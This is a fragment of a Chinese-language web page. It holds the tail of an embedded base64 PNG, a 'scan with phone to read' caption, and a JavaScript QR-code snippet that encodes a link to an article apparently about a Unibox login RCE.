Ey2PsBmLiwtecwBgIZFrwPT67TUhf75LeB5I/0yE+CNqvsNeWVtH1FYe5pz6Y9epZYV6E2dd1mPPVo0Jf4RhIkStefwLXQF4/g2kH/wMAAP//mnW/fwAAAAZJREFUAwBYs5LOQGgLRQAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/unibox-authentication-test\_userlogin-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 